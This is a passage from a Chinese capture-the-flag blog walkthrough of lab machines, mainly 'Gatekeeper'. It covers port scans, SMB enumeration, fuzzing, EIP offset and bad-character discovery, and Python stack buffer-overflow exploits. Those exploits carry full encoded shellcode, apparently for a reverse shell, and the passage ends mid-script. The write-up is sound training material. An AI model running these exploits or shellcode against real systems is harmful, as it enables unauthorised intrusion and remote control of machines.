payload += <span class="hljs-string">"\xb8\x4d\x48\xe7\xc4\x9b\x3e\x07\x74\x72\x07\x38"</span>
payload += <span class="hljs-string">"\xb9\x12\x8f\x41\xa7\x82\x70\x98\x63\xa2\x92\x08"</span>
payload += <span class="hljs-string">"\x9e\x4b\x0b\xd9\x23\x16\xac\x34\x67\x2f\x2f\xbc"</span>
payload += <span class="hljs-string">"\x18\xd4\x2f\xb5\x1d\x90\xf7\x26\x6c\x89\x9d\x48"</span>
payload += <span class="hljs-string">"\xc3\xaa\xb7"</span>
postfix = <span class="hljs-string">""</span>

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

<span class="hljs-keyword">try</span>:
  s.connect((ip, port))
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Sending evil buffer..."</span>)
  s.recv(<span class="hljs-number">1024</span>)
  s.send(<span class="hljs-built_in">bytes</span>(username + <span class="hljs-string">"\r\n"</span>, <span class="hljs-string">"latin-1"</span>))
  s.recv(<span class="hljs-number">1024</span>)
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"message:"</span>)
  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">'\r\n'</span>, <span class="hljs-string">"latin-1"</span>))
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Done!"</span>)
<span class="hljs-keyword">except</span>:
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Could not connect."</span>)</code></pre>
<p>运行之前，本地监听，得到shell，root.txt在如图所示位置</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839802.png" alt="image-20240602153556683"></p>
<h2 id="总结">总结</h2>
<p>常规IP扫描，发现ftp服务。肯定是要上去看一下的，然后发现里面存在一个有缓冲区溢出漏洞的exe文件。当然在此之前接触到了有关ftp命令以及被动模式的无法正常执行命令的情况。</p>
<p>然后将得到的应用程序放入debugger中进行调试，先fuzz出大概会引发溢出的字符长度，然后在发送对应长度的字符数据，得到精确的EIP的起始地址offset，随后发送全字符，找到会影响最终shellcode执行的badchars，当然在这里能发现ESP位置，随后利用mona得到JMP ESP地址，然后写EXP得到shell。</p>
<h1 id="0x14-gatekeeper">0x14 Gatekeeper</h1>
<h2 id="常规扫描">常规扫描</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839803.png" alt="image-20240603093426321"></p>
<p>常规nmap扫描，开放端口如上，我认为有效的只有上面5个。后面的估计是扫描速度过快的缘故，接下来进行具体端口的扫描，得到的结果如下</p>
<pre><code class="hljs scss">PORT      STATE SERVICE      VERSION                                                                                                                                                                                                                                                    
<span class="hljs-number">135</span>/tcp   open  msrpc        Microsoft Windows RPC                                                                                                                                                                                                                                      
<span class="hljs-number">139</span>/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                                                                                                                                                                              
<span class="hljs-number">445</span>/tcp   open  microsoft-ds Windows <span class="hljs-number">7</span> Professional <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span> microsoft-ds (workgroup: WORKGROUP)                                                                                                                                                                             
<span class="hljs-number">3389</span>/tcp  open  tcpwrapped                                                                                                                                                                                                                                                              
|_ssl-date: <span class="hljs-number">2024</span>-<span class="hljs-number">06</span>-<span class="hljs-number">03</span>T01:<span class="hljs-number">38</span>:<span class="hljs-number">44</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; -<span class="hljs-number">1s</span> from scanner <span class="hljs-selector-tag">time</span>.                                                                                                                                                                                                                           
| rdp-ntlm-info:                                                                                                                                                                                                                                                                        
|   Target_Name: GATEKEEPER                                                                                                                                                                                                                                                             
|   NetBIOS_Domain_Name: GATEKEEPER                                                                                                                                                                                                                                                     
|   NetBIOS_Computer_Name: GATEKEEPER                                                                                                                                                                                                                                                   
|   DNS_Domain_Name: gatekeeper                                                                                                                                                                                                                                                         
|   DNS_Computer_Name: gatekeeper                                                                                                                                                                                                                                                       
|   Product_Version: <span class="hljs-number">6.1</span>.<span class="hljs-number">7601</span>                                                                                                                                                                                                                                                           
|_  System_Time: <span class="hljs-number">2024</span>-<span class="hljs-number">06</span>-<span class="hljs-number">03</span>T01:<span class="hljs-number">38</span>:<span class="hljs-number">30</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>                                                                                                                                                                                                                                              
| ssl-cert: Subject: commonName=gatekeeper                                                                                                                                                                                                                                              
| Not valid before: <span class="hljs-number">2024</span>-<span class="hljs-number">06</span>-<span class="hljs-number">02</span>T00:<span class="hljs-number">50</span>:<span class="hljs-number">06</span>                                                                                                                                                                                                                                                 
|_Not valid after:  <span class="hljs-number">2024</span>-<span class="hljs-number">12</span>-<span class="hljs-number">02</span>T00:<span class="hljs-number">50</span>:<span class="hljs-number">06</span>                                                                                                                                                                                                                                                 
<span class="hljs-number">31337</span>/tcp open  Elite?                                                                                                                                                                                                                                                                  
| fingerprint-strings:                                                                                                                                                                                                                                                                  
|   FourOhFourRequest:                                                                                                                                                                                                                                                                  
|     Hello GET /nice%<span class="hljs-number">20</span>ports%<span class="hljs-number">2</span>C/Tri%<span class="hljs-number">6</span>Eity.txt%<span class="hljs-number">2</span>ebak HTTP/<span class="hljs-number">1.0</span>                                                                                                                                                                                                                           
|     Hello                                                                                                                                                                                                                                                                             
|   GenericLines:                                                                                                                                                                                                                                                                       
|     Hello                                                                                                                                                                                                                                                                             
|     Hello                                                                                                                                                                                                                                                                             
|   GetRequest:                                                                                                                                                                                                                                                                         
|     Hello GET / HTTP/<span class="hljs-number">1.0</span>                                                                                                                                                                                                                                                              
|     Hello                                                                                                                                                                                                                                                                             
|   HTTPOptions:                                                                                                                                                                                                                                                                        
|     Hello OPTIONS / HTTP/<span class="hljs-number">1.0</span>                                                                                                                                                                                                                                                          
|     Hello                                                                                                                                                                                                                                                                             
|   Help:                                                                                                                                                                                                                                                                               
|     Hello HELP                                                                                                                                                                                                                                                                        
|   Kerberos:                                                                                                                                                                                                                                                                           
|     Hello !!!                                                                                                                                                                                                                                                                         
|   LDAPSearchReq:                                                                                                                                                                                                                                                                      
|     Hello <span class="hljs-number">0</span>                                                                                                                                                                                                                                                                           
|     Hello                                                                                                                                                                                                                                                                             
|   LPDString:                                                                                                                                                                                                                                                                          
|     Hello                                                                                                                                                                                                                                                                             
|     default!!!                                                                                                                                                                                                                                                                        
|   RTSPRequest:                                                                                                                                                                                                                                                                        
|     Hello OPTIONS / RTSP/<span class="hljs-number">1.0</span>                                                                                                                                                                                                                                                          
|     Hello                                                                                                                                                                                                                                                                             
|   SIPOptions:                                                                                                                                                                                                                                                                         
|     Hello OPTIONS sip:nm SIP/<span class="hljs-number">2.0</span>                                                                                                                                                                                                                                                      
|     Hello Via: SIP/<span class="hljs-number">2.0</span>/TCP nm;branch=foo                                                                                                                                                                                                                                              
|     Hello From: ;tag=root                                                                                                                                                                                                                                                  
|     Hello To:                                                                                                                                                                                                                                                            
|     Hello Call-ID: <span class="hljs-number">50000</span>                                                                                                                                                                                                                                                              
|     Hello CSeq: <span class="hljs-number">42</span> OPTIONS                                                                                                                                                                                                                                                            
|     Hello Max-Forwards: <span class="hljs-number">70</span>                                                                                                                                                                                                                                                            
|     Hello Content-Length: <span class="hljs-number">0</span>                                                                                                                                                                                                                                                           
|     Hello Contact:                                                                                                                                                                                                                                                         
|     Hello Accept: application/sdp                                                                                                                                                                                                                                                     
|     Hello                                                                                                                                                                                                                                                                             
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:                                                                                                                                                                                                                                 
|_    Hello                                                                                                                                                                                                                                                                             
<span class="hljs-number">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                                                                                            
SF-Port31337-TCP:V=<span class="hljs-number">7.94S</span>VN%I=<span class="hljs-number">7%</span>D=<span class="hljs-number">6</span>/<span class="hljs-number">3%</span>Time=<span class="hljs-number">665</span>D1DFD%P=x86_64-pc-linux-gnu%r                                                                                                                                                                                                              
SF:(GetRequest,<span class="hljs-number">24</span>,<span class="hljs-string">"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"</span>)                                                                                                                                                                                                              
SF:%<span class="hljs-built_in">r</span>(SIPOptions,<span class="hljs-number">142</span>,<span class="hljs-string">"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x                                                                                                                                                                                                              </span>
<span class="hljs-string">SF:20Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20</span>
<span class="hljs-string">SF:@nm&gt;;tag=root\r!!!\nHello\x20To:\x20\r!!!\nHello\x20Call-I                                                                                                                                                                                                              </span>
<span class="hljs-string">SF:D:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Fo                                                                                                                                                                                                              </span>
<span class="hljs-string">SF:rwards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contac                                                                                                                                                                                                              </span>
<span class="hljs-string">SF:t:\x20\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello                                                                                                                                                                                                              </span>
<span class="hljs-string">SF:\x20\r!!!\n"</span>)%<span class="hljs-built_in">r</span>(GenericLines,<span class="hljs-number">16</span>,<span class="hljs-string">"Hello\x20\r!!!\nHello\x20\r!!!\n"</span>)%<span class="hljs-built_in">r</span>(H                                                                                                                                                                                                              
SF:TTPOptions,<span class="hljs-number">28</span>,<span class="hljs-string">"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\                                                                                                                                                                                                              </span>
<span class="hljs-string">SF:n"</span>)%<span class="hljs-built_in">r</span>(RTSPRequest,<span class="hljs-number">28</span>,<span class="hljs-string">"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x2                                                                                                                                                                                                              </span>
<span class="hljs-string">SF:0\r!!!\n"</span>)%<span class="hljs-built_in">r</span>(Help,F,<span class="hljs-string">"Hello\x20HELP\r!!!\n"</span>)%<span class="hljs-built_in">r</span>(SSLSessionReq,C,<span class="hljs-string">"Hello\x2                                                                                                                                                                                                              </span>
<span class="hljs-string">SF:0\x16\x03!!!\n"</span>)%<span class="hljs-built_in">r</span>(TerminalServerCookie,B,<span class="hljs-string">"Hello\x20\x03!!!\n"</span>)%<span class="hljs-built_in">r</span>(TLSSe                                                                                                                                                                                                              
SF:ssionReq,C,<span class="hljs-string">"Hello\x20\x16\x03!!!\n"</span>)%<span class="hljs-built_in">r</span>(Kerberos,A,<span class="hljs-string">"Hello\x20!!!\n"</span>)%<span class="hljs-built_in">r</span>(F                                                                                                                                                                                                              
SF:ourOhFourRequest,<span class="hljs-number">47</span>,<span class="hljs-string">"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2e                                                                                                                                                                                                              </span>
<span class="hljs-string">SF:bak\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"</span>)%<span class="hljs-built_in">r</span>(LPDString,<span class="hljs-number">12</span>,<span class="hljs-string">"Hello\x20\x01                                                                                                                                                                                                              </span>
<span class="hljs-string">SF:default!!!\n"</span>)%<span class="hljs-built_in">r</span>(LDAPSearchReq,<span class="hljs-number">17</span>,<span class="hljs-string">"Hello\x200\x84!!!\nHello\x20\x01!!!\                                                                                                                                                                                                              </span>
<span class="hljs-string">SF:n"</span>);                                                                                                                                                                                                                                                                                 
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                                                                              
                                                                                                                                                                                                                                                                                        
Host script results:                                                                                                                                                                                                                                                                    
| smb-os-discovery:                                                                                                                                                                                                                                                                     
|   OS: Windows <span class="hljs-number">7</span> Professional <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span> (Windows <span class="hljs-number">7</span> Professional <span class="hljs-number">6.1</span>)                                                                                                                                                                                                         
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional                                                                                                                                                                                                                                
|   Computer name: gatekeeper                                                                                                                                                                                                                                                           
|   NetBIOS computer name: GATEKEEPER\x00                                                                                                                                                                                                                                               
|   Workgroup: WORKGROUP\x00                                                                                                                                                                                                                                                            
|_  System time: <span class="hljs-number">2024</span>-<span class="hljs-number">06</span>-<span class="hljs-number">02</span>T21:<span class="hljs-number">38</span>:<span class="hljs-number">29</span>-<span class="hljs-number">04</span>:<span class="hljs-number">00</span>                                                                                                                                                                                                                                              
| smb2-security-mode:                                                                                                                                                                                                                                                                   
|   <span class="hljs-number">2</span>:<span class="hljs-number">1</span>:<span class="hljs-number">0</span>:                                                                                                                                                                                                                                                                              
|_    Message signing enabled but not required                                                                                                                                                                                                                                          
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: , NetBIOS MAC: <span class="hljs-number">02</span>:<span class="hljs-number">00</span>:<span class="hljs-number">6</span>e:<span class="hljs-number">84</span>:<span class="hljs-number">89</span>:<span class="hljs-number">8</span>d (unknown)                                                                                                                                                                                   
| smb2-time:                                                                                                                                                                                                                                                                            
|   date: <span class="hljs-number">2024</span>-<span class="hljs-number">06</span>-<span class="hljs-number">03</span>T01:<span class="hljs-number">38</span>:<span class="hljs-number">29</span>                                                                                                                                                                                                                                                           
|_  start_date: <span class="hljs-number">2024</span>-<span class="hljs-number">06</span>-<span class="hljs-number">03</span>T00:<span class="hljs-number">49</span>:<span class="hljs-number">54</span>                                                                                                                                                                                                                                                     
| smb-security-mode:                                                                                                                                                                                                                                                                    
|   account_used: guest                                                                                                                                                                                                                                                                 
|   authentication_level: user                                                                                                                                                                                                                                                          
|   challenge_response: supported                                                                                                                                                                                                                                                       
|_  message_signing: disabled (dangerous, but default)                                                                                                                                                                                                                                  
|_clock-skew: mean: <span class="hljs-number">47</span>m59s, deviation: <span class="hljs-number">1</span>h47m20s, median: -<span class="hljs-number">1s</span>                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                        
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                                                                                          
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">180.95</span> seconds</code></pre>
<p>接下来重点枚举SMB</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839804.png" alt="image-20240603095536817"></p>
<p>发现存在四个共享用户，接着利用nmap具体枚举445</p>
<pre><code class="hljs scss">nmap -<span class="hljs-selector-tag">p</span> <span class="hljs-number">445</span> <span class="hljs-attr">--script</span>=smb-enum-shares<span class="hljs-selector-class">.nse</span>,smb-enum-users<span class="hljs-selector-class">.nse</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.71</span><span class="hljs-selector-class">.25</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839805.png" alt="image-20240603095624808"></p>
<p>这里进入IPC没啥东西，但Users是可读的，我们进入之后下载相关文件</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839806.png" alt="image-20240603095703455"></p>
<p>找了半天也没其他相关文件了，就直接将exe下载到我们本地上进行测试。</p>
<h2 id="fuzzing">Fuzzing</h2>
<p>直接debugger运行二进制文件，然后开始模糊测试，这里不知道为何我脚本总是无法运行，与其他文章的脚本比较，感觉没啥出入，但就是不可，不理解。。。</p>
<p>这里找了一个能正常运行的脚本，py2环境</p>
<pre><code class="hljs scss">import sys
import socket
from <span class="hljs-selector-tag">time</span> import sleep

ip = "<span class="hljs-number">192.168</span><span class="hljs-selector-class">.246</span><span class="hljs-selector-class">.235</span>" # this my windows lab ip
port = <span class="hljs-number">31337</span> # the application targeted port
buffer = '<span class="hljs-selector-tag">A</span>' * <span class="hljs-number">50</span> # bufer

while True:
	try:
		s = socket.<span class="hljs-built_in">socket</span>(socket.AF_INET, socket.SOCK_STREAM)
		s.<span class="hljs-built_in">connect</span>((ip, port))

		s.<span class="hljs-built_in">send</span>((buffer+<span class="hljs-string">'\r\n'</span>)) # send the buffer over the tcp connection
		s.<span class="hljs-built_in">close</span>()
		<span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>)
		buffer += <span class="hljs-string">'A'</span> * <span class="hljs-number">50</span>
	except:
		print <span class="hljs-string">"fuzzing crashed at %s bytes"</span> % <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(buffer))  # tell the attacker where the application crashed
		sys.<span class="hljs-built_in">exit</span>()</code></pre>
<p>运行之后如上图所示，这意味着崩溃的字符串长度在150之上</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839807.png" alt="image-20240603110532825"></p>
<h2 id="寻找eip">寻找EIP</h2>
<p>接下来用msf生成指定长度的字符串</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839808.png" alt="image-20240603112714858"></p>
<p>我们nc连接端口，接着发送上述数据，然后键入以下命令，得到EIP的偏移量</p>
<pre><code class="hljs scss">!mona findmsp -distance <span class="hljs-number">200</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839809.png" alt="image-20240603113001109"></p>
<p>接下来写脚本，尝试覆盖EIP，证明我们的正确性</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> socket

ip = <span class="hljs-string">"192.168.246.235"</span>
port = <span class="hljs-number">31337</span>

username = <span class="hljs-string">"hybcx"</span>

<span class="hljs-comment">#prefix = "OVERFLOW7 "</span>
prefix = <span class="hljs-string">""</span>
offset = <span class="hljs-number">146</span>
overflow = <span class="hljs-string">"A"</span> * offset
retn = <span class="hljs-string">"BBBB"</span>
padding = <span class="hljs-string">""</span>
payload = <span class="hljs-string">""</span>
postfix = <span class="hljs-string">""</span>

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

<span class="hljs-keyword">try</span>:
  s.connect((ip, port))
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Sending evil buffer..."</span>)
  <span class="hljs-comment">#s.recv(1024)</span>
  <span class="hljs-comment">#s.send(bytes(username + "\r\n", "latin-1"))</span>
  <span class="hljs-comment">#s.recv(1024)</span>
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"message:"</span>)
  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">'\r\n'</span>, <span class="hljs-string">"latin-1"</span>))
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Done!"</span>)
<span class="hljs-keyword">except</span>:
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Could not connect."</span>)</code></pre>
<p>发送上述脚本，如下图得到结果，发现我们成功覆盖EIP</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839810.png" alt="image-20240603113418206"></p>
<h2 id="确定badchars">确定badchars</h2>
<p>接下来就是寻找badchars了，直接运行脚本，也就是将上面的payload赋值为全字符即可</p>
<p>随后发送得到下图</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839811.png" alt="image-20240603114032577"></p>
<p>根据上图的ESP地址，我们键入mona命令，得到当前坏字符为00 0a，00是必有的，这里懒得测试了，直接猜测0a就是坏字符即可。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839812.png" alt="image-20240603114257621"></p>
<h2 id="shellcode拿shell">Shellcode拿shell</h2>
<p>这里我们寻找JMP ESP，如下图，只发现两个，我选择第一个：\xc3\x14\x04\x08</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839813.png" alt="image-20240603114739585"></p>
<p>随后直接编写脚本，拿shell即可</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> socket

ip = <span class="hljs-string">"10.10.71.25"</span>
port = <span class="hljs-number">31337</span>

username = <span class="hljs-string">"hybcx"</span>

<span class="hljs-comment">#prefix = "OVERFLOW7 "</span>
prefix = <span class="hljs-string">""</span>
offset = <span class="hljs-number">146</span>
overflow = <span class="hljs-string">"A"</span> * offset
retn = <span class="hljs-string">"\xc3\x14\x04\x08"</span>
padding = <span class="hljs-string">"\x90"</span> * <span class="hljs-number">32</span>
payload =  <span class="hljs-string">""</span>
payload += <span class="hljs-string">"\xbb\x77\xfe\x19\x4f\xd9\xe5\xd9\x74\x24\xf4\x5a"</span>
payload += <span class="hljs-string">"\x33\xc9\xb1\x5e\x31\x5a\x15\x83\xc2\x04\x03\x5a"</span>
payload += <span class="hljs-string">"\x11\xe2\x82\x02\xf1\xc0\x6c\xfb\x02\xbf\x5d\x29"</span>
payload += <span class="hljs-string">"\x8b\xda\xf9\x46\xde\x14\x8a\x0b\xd3\xdf\xde\xbf"</span>
payload += <span class="hljs-string">"\xda\x20\xd1\x08\x56\xf9\x66\x04\x4f\x34\xb8\x45"</span>
payload += <span class="hljs-string">"\xb3\x57\x44\x94\xe0\xb7\x75\x57\xf5\xb6\xb2\x21"</span>
payload += <span class="hljs-string">"\x73\x56\x6e\xe5\xf0\xfa\x9e\x82\x45\xc7\x9f\x44"</span>
payload += <span class="hljs-string">"\xc2\x77\xe7\xe1\x15\x03\x5b\xeb\x45\x67\x2b\xf3"</span>
payload += <span class="hljs-string">"\xee\x20\x8b\x53\xf0\x03\x4e\x9a\x86\x9f\x19\x2c"</span>
payload += <span class="hljs-string">"\x98\x6b\xad\xc5\x67\xba\xfc\x19\xa6\x8d\xf3\x35"</span>
payload += <span class="hljs-string">"\x28\xd5\x33\xa6\x5e\x2d\x40\x5b\x59\xf6\x3b\x87"</span>
payload += <span class="hljs-string">"\xec\xe9\x9b\x4c\x56\xce\x1a\x80\x01\x85\x10\x6d"</span>
payload += <span class="hljs-string">"\x45\xc1\x34\x70\x8a\x79\x40\xf9\x2d\xae\xc1\xb9"</span>
payload += <span class="hljs-string">"\x09\x6a\x8a\x1a\x33\x2b\x76\xcc\x4c\x2b\xde\xb1"</span>
payload += <span class="hljs-string">"\xe8\x27\xcc\xa4\x8d\xc7\x0f\xc9\xd3\x5f\xdc\x04"</span>
payload += <span class="hljs-string">"\xec\x9f\x4a\x1e\x9f\xad\xd5\xb4\x37\x9e\x9e\x12"</span>
payload += <span class="hljs-string">"\xcf\x97\x88\xa4\x1f\x1f\xd8\x5a\xa0\x60\xf1\x98"</span>
payload += <span class="hljs-string">"\xf4\x30\x69\x08\x75\xdb\x69\xb5\xa0\x76\x63\x21"</span>
payload += <span class="hljs-string">"\x41\x8c\x32\x7a\x3d\x90\xb4\x69\x0d\x1d\x52\xc1"</span>
payload += <span class="hljs-string">"\x21\x4e\xca\xa2\x91\x2e\xba\x4a\xf8\xa0\xe5\x6b"</span>
payload += <span class="hljs-string">"\x03\x6b\x8e\x06\xec\xc2\xe7\xbe\x95\x4e\x73\x5e"</span>
payload += <span class="hljs-string">"\x59\x45\xfe\x60\xd1\x6c\xff\x2f\x12\x04\x13\x47"</span>
payload += <span class="hljs-string">"\x45\xe6\xeb\x98\xe0\xe6\x81\x9c\xa2\xb1\x3d\x9f"</span>
payload += <span class="hljs-string">"\x93\xf6\xe2\x60\xf6\x84\xe4\x9f\x87\xbc\x9f\x96"</span>
payload += <span class="hljs-string">"\x1d\x81\xf7\xd6\xf1\x01\x07\x81\x9b\x01\x6f\x75"</span>
payload += <span class="hljs-string">"\xf8\x51\x8a\x7a\xd5\xc5\x07\xef\xd6\xbf\xf4\xb8"</span>
payload += <span class="hljs-string">"\xbe\x3d\x23\x8e\x60\xbd\x06\x8c\x67\x41\xd5\xbb"</span>
payload += <span class="hljs-string">"\xcf\x2a\x25\xfc\xef\xaa\x4f\xfc\xbf\xc2\x84\xd3"</span>
payload += <span class="hljs-string">"\x30\x23\x65\xfe\x18\x2b\xec\x6f\xea\xca\xf1\xa5"</span>
payload += <span class="hljs-string">"\xaa\x52\xf2\x4a\x77\x64\x89\x23\x88\x85\x6e\x2a"</span>
payload += <span class="hljs-string">"\xed\x85\x6f\x52\x13\xb9\xa6\x6b\x61\xfc\x7b\xc8"</span>
payload += <span class="hljs-string">"\x6a\xe3\x51\x25\x03\xba\x30\x84\x4e\x3d\xef\xcb"</span>
payload += <span class="hljs-string">"\x76\xbe\x05\xb4\x8c\xde\x6c\xb1\xc9\x58\x9d\xcb"</span>
payload += <span class="hljs-string">"\x42\x0d\xa1\x78\x62\x04"</span>
postfix = <span class="hljs-string">""</span>

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

<span class="hljs-keyword">try</span>:
  s.connect((ip, port))
  <span class="hljs-comment">#print("Sending evil buffer...")</span>
  <span class="hljs-comment">#s.recv(1024)</span>
  <span class="hljs-comment">#s.send(bytes(username + "\r\n", "latin-1"))</span>
  <span class="hljs-comment">#s.recv(1024)</span>
